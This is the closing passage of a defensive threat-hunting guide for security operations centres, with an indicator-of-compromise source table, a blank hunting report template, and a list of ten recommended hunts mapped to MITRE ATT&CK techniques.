| **File Hashes** | Malware hashes (MD5, SHA1, SHA256) | EDR, Sysmon Event 11, file analysis |
| **Email Addresses** | Attacker sender addresses | Email headers |
| **File Names/Paths** | Malware file names, persistence paths | EDR, Sysmon, file system |
| **Registry Keys** | Persistence registry entries | Sysmon Event 13, registry audit |
| **User Agents** | C2 beacon user agents | Proxy logs |
| **JA3/JA3S Hashes** | TLS fingerprints of C2 | Network sensor, SSL inspection |
| **YARA Rules** | Pattern-based malware detection | Custom creation from analysis |
| **Sigma Rules** | Log-based detection rules | Custom creation from hunting |

---

## 19. Threat Hunting Report Template

```
═══════════════════════════════════════════════════════════
              THREAT HUNTING REPORT
═══════════════════════════════════════════════════════════

Hunt ID:            TH-YYYY-MM-###
Hunt Name:          [Descriptive Name]
Hunter:             [Analyst Name]
Date:               [Start Date] — [End Date]
Status:             [Active / Completed / Escalated to IR]

───────────────────────────────────────────────────────────
HYPOTHESIS
───────────────────────────────────────────────────────────
[What were you looking for and why?]

MITRE ATT&CK Mapping:
  Tactic:     [e.g., Persistence]
  Technique:  [e.g., T1053.005 — Scheduled Task]

Trigger:
  □ Intelligence-driven (cite report/advisory)
  □ Hypothesis-driven (cite reasoning)
  □ Anomaly-driven (cite data pattern)

───────────────────────────────────────────────────────────
DATA SOURCES & QUERIES
───────────────────────────────────────────────────────────
Data Sources Used:
  □ SIEM (Splunk / Sentinel / QRadar)
  □ EDR (CrowdStrike / Defender / SentinelOne)
  □ Firewall / Proxy / DNS
  □ Active Directory / Azure AD
  □ Other: ____________

Key Queries:
  [Paste actual SIEM/EDR queries used]

Time Range Searched:  [e.g., Last 30 days]
Scope:               [e.g., All endpoints / Servers only]

───────────────────────────────────────────────────────────
FINDINGS
───────────────────────────────────────────────────────────
Result:  □ Positive (Threat Found)  □ Negative (No Threat)

If Positive:
  Summary:        [Brief description of finding]
  Severity:       [Critical / High / Medium / Low]
  Affected Assets: [List hosts, users, services]
  IOCs Found:     [List IPs, domains, hashes]
  Timeline:       [Attack timeline]

If Negative:
  Conclusion:     [Why no threat was found]
  Coverage Gaps:  [Any data sources missing?]

───────────────────────────────────────────────────────────
ACTIONS TAKEN
───────────────────────────────────────────────────────────
  □ Escalated to Incident Response (IR-YYYY-###)
  □ IOCs submitted to threat intel platform
  □ New SIEM detection rule created (Rule ID: ___)
  □ Sigma/YARA rule written
  □ Tuned existing detection rules
  □ Reported to management
  □ No action required

───────────────────────────────────────────────────────────
RECOMMENDATIONS
───────────────────────────────────────────────────────────
  [What should the organization do to improve defenses?]

═══════════════════════════════════════════════════════════
```

---

## 20. Top 10 High-Value Hunts Every SOC Should Run Regularly

| # | Hunt | MITRE Technique | Frequency | Difficulty |
|---|------|----------------|-----------|------------|
| 1 | **Encoded PowerShell execution** | T1059.001 | Weekly | Medium |
| 2 | **LSASS access by non-system processes** | T1003.001 | Weekly | Medium |
| 3 | **Beaconing detection (interval analysis)** | T1071 | Weekly | Hard |
| 4 | **New scheduled tasks on DCs/servers** | T1053.005 | Daily | Easy |
| 5 | **Admin share (C$/ADMIN$) access from workstations** | T1021.002 | Weekly | Easy |
| 6 | **Event log clearing on critical servers** | T1070.001 | Daily | Easy |
| 7 | **Kerberoasting (mass TGS requests)** | T1558.003 | Weekly | Medium |
| 8 | **Office apps spawning command shells** | T1204.002 | Daily | Easy |
| 9 | **DNS query anomalies (high entropy, long labels)** | T1071.004 | Weekly | Hard |
| 10 | **Large outbound data transfers after-hours** | T1041/T1567 | Daily | Medium |

---

*End of Threat Hunting SOC Guide (Parts 1-4). This guide covers all 14 MITRE ATT&CK Enterprise tactics with real-world True Positive scenarios, step-by-step investigation procedures, detection checklists, and SOC analyst playbooks.*


---

